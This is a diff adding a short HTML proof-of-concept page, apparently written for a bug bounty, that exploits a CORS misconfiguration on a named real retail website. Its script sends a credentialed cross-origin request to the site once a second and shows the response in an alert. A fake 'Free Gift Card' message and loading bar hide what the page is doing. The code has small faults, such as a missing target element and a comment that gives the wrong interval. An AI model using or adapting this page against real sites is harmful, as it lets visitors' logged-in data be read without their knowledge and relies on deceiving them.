@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <title>Exploit POC</title>
+      <script>
+         function cors() {
+                var xhttp = new XMLHttpRequest();
+                        xhttp.onreadystatechange = function() {
+                                if (this.readyState == 4 && this.status == 200) {
+                                        document.getElementById("mainDiv").innerHTML = alert(this.responseText);
+                }
+         };
+         xhttp.open("GET", "https://www.edited.at/product/bluse-ava-8322934.avif?randomxx", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+</head>
+   <body>
+      <center>
+      <h2>PoC Exploit </h2>
+      <h3>created with <3 and some broken logics</a></h3>
+      <h3>I am not very good with javascript but tried some logic so please bear with me...lol</h3>
+      <div id="demo">
+<h1> Congratulations you have won a Free Gift Card !! </h1> 
+         <center> <h3> Loading your Gift Card...27%</h3></center></div>
+         <script>
+var myVar = setInterval(cors, 1000); //setting the loop with time interval to run every 10 secs
+
+//clearInterval(myVar); //call this line to stop the loop
+</script>
+   </body>
+</html>
